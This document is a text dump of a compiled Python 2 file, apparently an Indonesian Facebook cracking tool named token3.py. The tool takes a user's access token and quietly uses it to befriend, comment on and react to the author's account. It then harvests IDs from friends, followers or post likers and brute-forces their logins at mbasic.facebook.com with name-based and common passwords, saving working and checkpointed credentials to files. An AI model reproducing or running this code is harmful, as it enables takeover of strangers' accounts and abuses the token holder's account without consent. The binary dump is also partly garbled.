ó
Rh`c           @   s§  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 m
 Z
 d  d l m Z d  d l m Z e e  e j d  y d  d l Z Wn e k
 rï e  j d  n Xy d  d l Z Wn e k
 r e  j d  n Xd   Z d	   Z d
 Z d Z g  Z g  Z g  a g  a g  Z g  Z g  Z d   Z d   Z d   Z  d   Z! e" d k r£e   n  d S(   iÿÿÿÿN(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8s   pip2 install requestss   pip2 install mechanizec           C   s   d GHt  j j   d  S(   Ns   [0;91m[!] Exit !!!(   t   ost   syst   exit(    (    (    s   /sdcard/token3.pyt   keluar   s    c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¸ëQ¸?(   R   t   stdoutt   writet   flusht   timet   sleep(   t   zt   e(    (    s   /sdcard/token3.pyt   jalan!   s    s  [0;91mââ³âââ âââ¸   âºâ³â¸ââââ»â âââ¸âââ»
[0;91mââââ£â»ââ£â¸ âºââ¸ â â ââ£â»ââ£â¸ âââ« [0;93mâ­ [0;92mfb.com/757953543
[0;97mâ¹ â¹ââââ¹      â¹ ââââ¹ â¹âââ¸â¹ â¹i    c          C   sì   t  j d  t GHd d GHt d  }  ye t j d |   } t j | j  } | d } t	 d d  } | j
 |   | j   d	 GHt   WnY t k
 rÅ d
 GHt  j d  t j d  t   n# t j j k
 rç d GHt   n Xd  S(   Nt   cleari2   s
   [0;92mâs   [0;92m[?] Token :[0;93m s+   https://graph.facebook.com/me?access_token=t   names	   login.txtt   ws   [0;92m[!] Login Berhasil !!!s   [0;91m[!] Token Salah !!!sL   xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feedg333333û?s   [0;91m[!] Koneksi Eror !!!(   R   t   systemt   logot	   raw_inputt   requestst   gett   jsont   loadst   textt   openR	   t   closet	   bot_koment   KeyErrorR   R   t	   log_tokent
   exceptionst   SSLErrorR   (   t   tokett   otwt   at   namat   zedd(    (    s   /sdcard/token3.pyR   4   s*    	


c          C   s  y t  d d  j   }  Wn# t k
 r> d GHt j d  n Xd } d } d } d } d	 } d
 } d } t j d | d |   t j d | d | d |   t j d | d | d |   t j d | d | d |   t j d | d | d |   t   d  S(   Ns	   login.txtt   rs   [0;91m[!] Token Invalid !!!s   rm -rf login.txtt	   757953543s   I love you @[757953543:]t   LOVEt   10158795312888544t   10158807643598544s   Keren Bro â¤ï¸s7   https://graph.facebook.com/me/friends?method=post&uids=s   &access_token=s   https://graph.facebook.com/s   /comments/?message=s   /reactions?type=(   R   t   readt   IOErrorR   R   R   t   postt   menu(   R"   t   unat   komt   reacR.   t   post2t   kom2t   reac2(    (    s   /sdcard/token3.pyR   K   s$    !!!!c          C   sM  t  j d  y t d d  j   }  Wn2 t k
 rZ t  j d  t  j d  t   n Xy= t j d |   } t j	 | j
  } | d } | d } Wnf t k
 rÞ t  j d  d GHt  j d  t j d	  t   n# t j j k
 r d
 GHt   n Xt  j d  t GHd d GHd | GHd GHd GHd GHd GHd d GHt   d  S(   NR   s	   login.txtR'   s   rm -rf login.txts+   https://graph.facebook.com/me?access_token=R   t   ids   [0;91m[!] Token Invalid !!!i   s   [0;91m[!] Koneksi Eror !!!i2   s
   [0;92mâs   [0;93mNama : [0;97ms   [0;93m[1] Crack ID Publiks   [0;93m[2] Crack Dari Followerss   [0;93m[3] Crack Dari Like Posts   [0;91m[0] Logout(   R   R   R   R,   R-   t   masukR   R   R   R   R   R   R   R   R    R   R   R   t   daftar_menu(   R"   R#   R$   R%   R6   (    (    s   /sdcard/token3.pyR/   _   s>    

			c    	         s  t  d  }  |  d k r' d GHt   n?|  d k rOt j d  t GHd d GHt  d  } yS t d	 d
  j     t j d | d    } t	 j
 | j  } d | d GHWnI t k
 rÖ d GHt  d  t   n# t j j k
 rø d GHt   n Xt j d | d    } t	 j
 | j  } x=| d D] } t j | d  q1Wn|  d k rYt j d  t GHd d GHt  d  } yS t d	 d
  j     t j d | d    } t	 j
 | j  } d | d GHWn' t k
 rþd GHt  d  t   n Xt j d | d   d  } t	 j
 | j  } x3| d D] } t j | d  q;Wn|  d k r%t j d  t GHd d GHt  d  } yl t d	 d
  j     t j d | d    } t	 j
 | j  } x# | d D] } t j | d  qÜWWqft k
 r!d GHt  d  t   qfXnA |  d k rZd GHt j d   t j d!  t   n d GHt   d" t t t   GHd# GH  f d$   } t d%  } | j | t  d# GHd& GHd' t t t   d( t t t   GHd) GHd# GHt  d  t j d*  d  S(+   Ns   [0;92m[?] Pilih : t    s   [0;91m[!] Isi Dengan Benar !!!t   1R   i2   s
   [0;92mâs    [0;92m[â] ID Publik : [0;93ms	   login.txtR'   s   https://graph.facebook.com/s   ?access_token=s   [0;92m[â] Nama : [0;93mR   s(   [0;91m[!] ID Publik Tidak Ditemukan !!!s   [0;92m
[Kembali]s   [0;91m[!] Koneksi Eror !!!s   /friends?access_token=t   dataR6   t   2s7   [0;91m[!] ID Tidak Ditemukan / Tidak Ada Followers !!!s   /subscribers?access_token=s   &limit=5000t   3s   âs   [0;92m[â] ID Post : [0;93ms"   /likes?limit=9999999&access_token=s&   [0;91m[!] ID Post Tidak Ditemukam !!!t   0s   [0;91m[!] Menghapus Token !!!i   s   rm -rf login.txts   [0;92m[â] Total ID : [0;93ms   [0;92mââââââââââââââââââââââââââââââââââââââââââââââââââc            sô  |  } y t  j d  Wn t k
 r* n Xy»t j d | d    } t j | j  } | d j   d } t j	 d d i | d 6| d	 6d
 d 6d i d d 6} | j
 } d | k sÇ d | k rd | d | GHt d d  } | j d | d |  | j   t j |  nËd | k ryd | d | GHt d d  } | j d | d |  | j   t j |  nl| d j   d }	 t j	 d d i | d 6|	 d	 6d
 d 6d i d d 6} | j
 } d | k såd | k r8d | d |	 GHt d d  } | j d | d |	  | j   t j |  n­d | k rd | d |	 GHt d d  } | j d | d |	  | j   t j |  nN| d j   d }
 t j	 d d i | d 6|
 d	 6d
 d 6d i d d 6} | j
 } d | k sd | k rVd | d |
 GHt d d  } | j d | d |
  | j   t j |  nd | k rµd | d |
 GHt d d  } | j d | d |
  | j   t j |  n0d } t j	 d d i | d 6| d	 6d
 d 6d i d d 6} | j
 } d | k sd | k rfd | d | GHt d d  } | j d | d |  | j   t j |  nd | k rÅd | d | GHt d d  } | j d | d |  | j   t j |  n d } t j	 d d i | d 6| d	 6d
 d 6d i d d 6} | j
 } d | k s#d | k rvd | d | GHt d d  } | j d | d |  | j   t j |  nod | k rÕd | d | GHt d d  } | j d | d |  | j   t j |  nd } t j	 d d i | d 6| d	 6d
 d 6d i d d 6} | j
 } d | k s3d | k rd | d | GHt d d  } | j d | d |  | j   t j |  n_ d | k råd | d | GHt d d  } | j d | d |  | j   t j |  n  Wn n Xd  S(   Nt   dones   https://graph.facebook.com/s   /?access_token=t
   first_namet   123s%   https://mbasic.facebook.com/login.phpR;   t   emailt   passt   submitt   logint   headerssÈ   Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L21 Build/HUAWEIVNS-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/312.0.0.45.117;]s
   user-agentt   mbasic_logout_buttons   save-devices   [0;92m[Ok] s    | s   ok.txtR$   s   
[Ok] t
   checkpoints   [0;93m[Cp] s   cp.txts   
[Cp] t   1234t   123456t   bangsatt   sayangt   anjing(   R   t   mkdirt   OSErrorR   R   R   R   R   t   lowerR.   t   contentR   R	   R   t   okst   appendt   cekpoint(   t   argt   emt   ant   vt   pwt   rext   xot   oket   cekt   pw2t   pw3t   pw4t   pw5t   pw6(   R"   (    s   /sdcard/token3.pyt   mainÇ   sÈ    7	

7	

7	

7	

7	

7	

i   s   [0;92m[â] Crack Selesai...s0   [0;92m[â] Total [0;92mOk[0;91m/[0;92mCp : t   /s8   [0;92m[â] Hasil [0;92mOk = ok.txt [0;93mCp = cp.txts   python2 token.py(   R   R8   R   R   R   R   R,   R   R   R   R   R   R   R/   R    R   R   R6   RS   R   R   t   strt   lenR    t   mapRR   RT   (	   t   mnt   idtt   pokt   spR'   R   t   iRc   t   p(    (   R"   s   /sdcard/token3.pyR8      s    
	

	
	

r)
t   __main__(#   R   t   reR   t	   itertoolsR   R   t   randomt	   threadingR   t   multiprocessing.poolR    t   requests.exceptionsR   t	   mechanizeR   t   reloadt   setdefaultencodingt   ImportErrorR   R   R   R   t   backt   threadst   berhasilRT   RR   R\   R6   t   fbidR   R   R/   R8   t   __name__(    (    (    s   /sdcard/token3.pyt   <module>   s<   x

					!	Ã


	Kalo Mau Recode Izin Dulu Bosss
